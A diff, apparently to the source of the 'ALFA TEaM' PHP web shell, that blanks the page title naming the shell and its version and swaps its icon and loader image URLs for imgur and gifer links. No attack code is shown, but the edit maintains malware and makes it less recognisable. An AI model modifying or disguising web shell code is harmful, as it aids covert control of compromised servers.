@@ -532,7 +532,7 @@ body{background: black;}
 #loginbox { font-size:11px; color:green; right:85px; width:1200px; height:200px; border-radius:5px; -moz-boder-radius:5px; position:fixed; top:250px; }
 #loginbox td { border-radius:5px; font-size:11px; }
 </style>
-<title>~ ALFA TEaM Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</title><center>
+<title></title><center>
 <center><img style="border-radius:100px;" width="500" height="250" alt="alfa team 2012" draggable="false" src="http://solevisible.com/images/alfa-iran.png" /></center>
 <div id=loginbox><p><font face="verdana,arial" size=-1>
 <center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
@@ -1234,9 +1234,9 @@ function showAnimation($name){
 	return '-webkit-animation: '.$name.' 800ms ease-in-out forwards;-moz-animation: '.$name.' 800ms ease-in-out forwards;-ms-animation: '.$name.' 800ms ease-in-out forwards;animation: '.$name.' 800ms ease-in-out forwards;';
 }
 function __showicon($r){
-	$s['btn']='http://solevisible.com/images/btn.png';
-	$s['alfamini']='http://solevisible.com/images/alfamini.png';
-	$s['loader']='http://solevisible.com/images/loader.svg';
+	$s['btn']='https://i.imgur.com/tqpclqF.png';
+	$s['alfamini']='https://i.gifer.com/ckP.gif';
+	$s['loader']='https://i.gifer.com/ckP.gif';
 	//return 'data:image/png;base64,'.__get_resource($s[$r]);
 	return $s[$r];
 }
